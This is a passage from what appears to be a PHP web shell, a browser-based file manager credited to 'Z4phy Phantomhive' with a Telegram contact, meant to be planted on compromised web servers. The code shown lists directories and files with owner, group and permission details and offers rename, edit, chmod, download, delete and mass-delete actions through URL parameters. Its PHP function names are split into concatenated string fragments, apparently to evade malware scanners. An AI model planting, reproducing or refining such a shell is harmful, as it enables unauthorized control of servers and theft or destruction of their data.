                            <th>Permission</th>
                            <th>Actions</th>
                        </tr>
                    </thead>
                    <tbody>
                        <tr>
                            <td><?='-'.'Z'.'4'.'P'.'-'?></td>
                            <td class="body-folder uk-text-nowrap"><a href="?path=<?=dirname($path)?>" class="dirpath font-white"><i class="fa-duotone fa-folders font-amber"></i>&nbsp;&nbsp;..</a></td>
                            <td><?='-'.'-'.'Z'.'4'.'P'.'H'.'Y'.'-'.'-'?></td>
                            <td><?='-'.'-'.'Z'.'4'.'P'.'H'.'Y'.'-'.'-'?></td>
                            <td><?='-'.'-'.'Z'.'4'.'P'.'H'.'Y'.'-'.'-'?></td>
                            <td><?='-'.'-'.'Z'.'4'.'P'.'H'.'Y'.'-'.'-'?></td>
                            <td><?='-'.'-'.'Z'.'4'.'P'.'H'.'Y'.'-'.'-'?></td>
                        </tr>
                        <?php
                        foreach ($scan as $dir) {
                            if (!is_dir("$path/$dir") || $dir == '.' || $dir == '..')
                                continue;

                            $func_exist = 'fu'.'nct'.'ion'.'_'.'ex'.'ist'.'s';
                            $psx_euid = 'p'.'os'.'ix'.'_'.'ge'.'te'.'u'.'i'.'d';
                            $psx_egid = 'p'.'os'.'ix'.'_'.'ge'.'te'.'g'.'i'.'d';
                            $psx_usr_uid = 'p'.'os'.'ix'.'_'.'g'.'et'.'pw'.'u'.'i'.'d';
                            $psx_grp_gid = 'p'.'os'.'ix'.'_'.'ge'.'tg'.'rg'.'i'.'d';
                            $myuid = 'g'.'et'.'my'.'ui'.'d';
                            $mygid = 'g'.'et'.'my'.'gi'.'d';
                            $cur_usr = 'g'.'et'.'_'.'cu'.'rr'.'en'.'t'.'_'.'us'.'er';
                            $own_f = 'fi'.'le'.'ow'.'n'.'er';
                            $grp_f = 'fi'.'le'.'gr'.'ou'.'p';
                            if($func_exist($psx_usr_uid)) {
                                $d_owner = @$psx_usr_uid($own_f("$path/$dir"));
                                $d_owner = $d_owner['name'];
                            }else{
                                $d_owner = $own_f("$path/$dir");
                            }
                            if($func_exist($psx_grp_gid)) {
                                $d_group = @$psx_grp_gid($grp_f("$path/$dir"));
                                $d_group = $d_group['name'];
                            }else{
                                $d_group = $grp_f("$path/$dir");
                            }
                            echo '<tr class="tr-body">';
                            echo '<td><input type="checkbox" class="checkfilefolder" name="checkfolder[]" value="'.$dir.'" aria-label="Checkbox"></td>';
                            echo '<td class="body-folder uk-text-nowrap"><a href="?path='.$path.'/'.$dir.'" class="dirpath font-white"><i class="fa-duotone fa-folders font-amber"></i>&nbsp;&nbsp;'.$dir.'</a></td>';
                            echo '<td class="uk-text-nowrap"><a href="?path='.$path.'&changedate='.$dir.'" class="body-datetime">'.date('Y-m-d H:i:s', filemtime($path.'/'.$dir)).'</a></td>';
                            echo '<td class="body-size uk-text-nowrap">--DIR--</td>';
                            echo '<td class="uk-text-nowrap">';
                                if ($d_owner == 'root' || $d_owner == 0) {
                                    echo '<font class="font-white">'.$d_owner.'</font>';
                                } else {
                                    echo '<font class="font-sky">'.$d_owner.'</font>';
                                }
                            echo '/';
                                if ($d_group == 'root' || $d_group == 0) {
                                    echo '<font class="font-white">'.$d_group.'</font>';
                                } else {
                                    echo '<font class="font-sky">'.$d_group.'</font>';
                                }
                            echo '</td>';
                            echo '<td class="uk-text-nowrap"><a href="?path='.$path.'&permission='.$dir.'" class="body-permission">';
                            $is_w = 'is'.'_'.'wr'.'it'.'ab'.'le';
                            $is_r = 'is'.'_'.'re'.'ad'.'ab'.'le';
                                if ($is_w("$path/$dir"))
                                    echo '<font class="font-green green-perms">';
                                elseif (!$is_r("$path/$dir"))
                                    echo '<font class="font-red red-perms">';
                                    echo perms("$path/$dir");

                                if ($is_w("$path/$dir") || !$is_r("$path/$dir"))
                            echo '</font></a></td>';
                            echo '<td class="uk-text-nowrap">';
                            echo '<a href="?path='.$path.'&rename='.$dir.'" uk-tooltip="Rename"><i class="icon fa-sharp fa-solid fa-pen-field rename-folder-icon"></i></a>';
                            echo '<a href="?path='.$path.'&permission='.$dir.'" class="uk-margin-small-left uk-margin-small-right" uk-tooltip="Permission"><i class="icon fa-duotone fa-user-pen user-icon"></i></a>';
                            echo '<a href="?path='.$path.'&deletedir='.$dir.'" uk-tooltip="Permission"><i class="icon fa-solid fa-trash-can-slash delete-icon"></i></a>';
                            echo '</td>';
                            echo '</tr>';
                        }
                        foreach ($scan as $file) {
                            $is_f = 'is'.'_'.'f'.'il'.'e';
                            $f_sz = 'f'.'il'.'es'.'iz'.'e';
                            $rnd = 'ro'.'un'.'d';
                            $f_time = 'fi'.'l'.'em'.'ti'.'m'.'e';
                            if (!$is_f("$path/$file"))
                                continue;
                            $size = $f_sz("$path/$file") / 1024;
                            $size = $rnd($size, 3);
                            if ($size >= 1024) {
                                $size = $rnd($size / 1024, 2) . ' MB';
                            } else {
                                $size = $size . ' KB';
                            }
                            $func_exist = 'fu'.'nct'.'ion'.'_'.'ex'.'ist'.'s';
                            $psx_euid = 'p'.'os'.'ix'.'_'.'ge'.'te'.'u'.'i'.'d';
                            $psx_egid = 'p'.'os'.'ix'.'_'.'ge'.'te'.'g'.'i'.'d';
                            $psx_usr_uid = 'p'.'os'.'ix'.'_'.'g'.'et'.'pw'.'u'.'i'.'d';
                            $psx_grp_gid = 'p'.'os'.'ix'.'_'.'ge'.'tg'.'rg'.'i'.'d';
                            $myuid = 'g'.'et'.'my'.'ui'.'d';
                            $mygid = 'g'.'et'.'my'.'gi'.'d';
                            $cur_usr = 'g'.'et'.'_'.'cu'.'rr'.'en'.'t'.'_'.'us'.'er';
                            $own_f = 'fi'.'le'.'ow'.'n'.'er';
                            $grp_f = 'fi'.'le'.'gr'.'ou'.'p';
                            if($func_exist($psx_usr_uid)) {
                                $f_owner = @$psx_usr_uid($own_f("$path/$file"));
                                $f_owner = $f_owner['name'];
                            }else{
                                $f_owner = $own_f("$path/$file");
                            }
                            if($func_exist($psx_grp_gid)) {
                                $f_group = @$psx_grp_gid($grp_f("$path/$file"));
                                $f_group = $f_group['name'];
                            }else{
                                $f_group = $grp_f("$path/$file");
                            }
                            echo '<tr class="tr-body">';
                            echo '<td><input type="checkbox" class="checkfilefolder" name="checkfile[]" value="'.$file.'" aria-label="Checkbox"></td>';
                            echo '<td class="body-file uk-text-nowrap"><a href="?path='.$path.'&editfile='.$file.'" class="filepath font-white"><i class="fa-solid fa-files font-white"></i>&nbsp;&nbsp;'.$file.'</a></td>';
                            echo '<td class="uk-text-nowrap"><a href="?path='.$path.'&changedate='.$file.'" class="body-datetime">'.date('Y-m-d H:i:s', filemtime($path.'/'.$file)).'</a></td>';
                            echo '<td class="body-size uk-text-nowrap">'.$size.'</td>';
                            echo '<td class="uk-text-nowrap">';
                                if ($f_owner == 'root' || $f_owner == 0) {
                                    echo '<font class="font-white">'.$f_owner.'</font>';
                                } else {
                                    echo '<font class="font-sky">'.$f_owner.'</font>';
                                }
                            echo '/';
                                if ($f_group == 'root' || $f_group == 0) {
                                    echo '<font class="font-white">'.$f_group.'</font>';
                                } else {
                                    echo '<font class="font-sky">'.$f_group.'</font>';
                                }
                            echo '</td>';
                            echo '<td class="uk-text-nowrap"><a href="?path='.$path.'&permission='.$file.'" class="body-permission">';
                            $is_w = 'is'.'_'.'wr'.'it'.'ab'.'le';
                            $is_r = 'is'.'_'.'re'.'ad'.'ab'.'le';
                                if ($is_w("$path/$file"))
                                    echo '<font class="font-green green-perms">';
                                elseif (!$is_r("$path/$file"))
                                    echo '<font class="font-red red-perms">';
                                    echo perms("$path/$file");

                                if ($is_w("$path/$file") || !$is_r("$path/$file"))
                            echo '</font></a></td>';
                            echo '<td class="uk-text-nowrap">';
                            echo '<a href="?path='.$path.'&rename='.$file.'" uk-tooltip="Rename"><i class="icon fa-sharp fa-solid fa-pen-field rename-file-icon"></i></a>';
                            echo '<a href="?path='.$path.'&editfile='.$file.'" class="uk-margin-small-left" uk-tooltip="Rename"><i class="icon fa-regular fa-file-pen edit-file-icon"></i></a>';
                            echo '<a href="?path='.$path.'&permission='.$file.'" class="uk-margin-small-left uk-margin-small-right" uk-tooltip="Permission"><i class="icon fa-duotone fa-user-pen user-icon"></i></a>';
                            echo '<a href="?path='.$path.'&downloadfile='.$file.'" class="uk-margin-small-right" uk-tooltip="Permission"><i class="icon fa-solid fa-folder-arrow-down download-icon"></i></a>';
                            echo '<a href="?path='.$path.'&deletefile='.$file.'" uk-tooltip="Permission"><i class="icon fa-solid fa-trash-can-slash delete-icon"></i></a>';
                            echo '</td>';
                            echo '</tr>';
                        }
                        ?>
                    </tbody>
                </table>
                <div class="uk-margin">
                    <script>
                        var selectAllCheckbox = document.getElementById('checkall');
                        var checkFileFolder = document.querySelectorAll('.checkfilefolder');
                        selectAllCheckbox.addEventListener('change', function() {
                            for (var i = 0; i < checkFileFolder.length; i++) {
                                checkFileFolder[i].checked = selectAllCheckbox.checked;
                            }
                        });
                        for (var i = 0; i < checkFileFolder.length; i++) {
                            checkFileFolder[i].addEventListener('change', function() {
                                var allChecked = true;
                                for (var j = 0; j < checkFileFolder.length; j++) {
                                    if (!checkFileFolder[j].checked) {
                                        allChecked = false;
                                        break;
                                    }
                                }
                                selectAllCheckbox.checked = allChecked;
                            });
                        }
                    </script>
                    <select class="mass-option font-white uk-select uk-width-1-6" aria-label="Custom controls" name="mass-option">
                        <option name="mass-delete" value="mass_delete">Delete</option>
                    </select>
                    <button type="submit" name="btn-mass" class="btn-mass font-white">&gt;&gt;</button>
                </div>
            </form>
        </div>
    </div>
    <div class="footer uk-margin-large-top uk-width-1-1 uk-flex uk-flex-center uk-flex-middle uk-flex-nowrap" style="background: var(--gray-950);">
    <!-- Hadehh lammer kang recode, tinggal pake doang malah di recode -->
        <div class="footer-content uk-padding-small">
            <span class="font-protest-riot"><font class="font-poppins">&copy;2020 - <?=date("Y");?></font> | <a class="font-rose" href="https://t.me/zaynphantomhive">Z4phy Phantomhive</a></span>
        </div>
    </div>
    <script src="<?=$uikit_js?>"></script>
    <script src="<?=$uikit_icon?>"></script>
</body>

</html>